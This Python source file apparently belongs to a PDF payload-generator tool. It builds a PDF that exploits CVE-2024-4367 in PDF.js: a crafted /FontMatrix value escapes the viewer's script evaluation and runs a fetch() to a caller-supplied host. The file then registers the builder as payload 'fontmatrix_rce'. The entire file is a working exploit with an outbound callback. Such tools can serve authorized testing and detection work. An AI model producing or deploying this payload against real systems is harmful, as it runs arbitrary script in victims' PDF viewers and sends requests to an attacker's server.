from __future__ import annotations

from nonpdf.core.branding import PDF_HEADER_COMMENT
from nonpdf.core.registry import PayloadEntry, registry


def build_fontmatrix(host: str) -> bytes:
    """CVE-2024-4367 — a string value in /FontMatrix breaks out of the
    PDF.js new Function() sandbox and executes arbitrary JS.
    """
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    matrix = (
        b" /FontMatrix [1 2 3 4 5 (1\\); fetch\\("
        + ('"' + host + '/f-fontmatrix")').encode()
        + b")]"
    )
    return (
        head
        + b"1 0 obj\n<< /Pages 2 0 R /Type /Catalog >>\nendobj\n"
        + b"2 0 obj\n<< /Count 1 /Kids [3 0 R] /MediaBox [0 0 595 842] /Type /Pages >>\nendobj\n"
        + b"3 0 obj\n<< /Contents 4 0 R /Parent 2 0 R /Resources << /Font << /F1 5 0 R >> >> /Type /Page >>\nendobj\n"
        + b"4 0 obj\n<< /Length 60 >>\nstream\nBT\n7 Tr\n10 20 TD\n/F1 20 Tf\n(F) Tj\nET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /BaseFont /NonPDFFont /FontDescriptor 6 0 R"
        + matrix
        + b" /Subtype /Type1 /Type /Font >>\nendobj\n"
        + b"6 0 obj\n<< /Flags 4 /FontBBox [-53 -251 1139 750] /FontFile 7 0 R /FontName /NonPDFFont /ItalicAngle 0 /Type /FontDescriptor >>\nendobj\n"
        + b"7 0 obj\n<< /Filter /ASCII85Decode /Length 0 >>\nstream\n\nendstream\nendobj\n"
        + b"trailer << /Root 1 0 R /Size 8 >>\n%%EOF\n"
    )


registry.register(PayloadEntry(
    id="F01", name="fontmatrix_rce",
    builder=lambda host: build_fontmatrix(host),
    description="PDF.js FontMatrix breakout to arbitrary JS",
    platform="pdfjs", cve="CVE-2024-4367", tags=("font",),
))
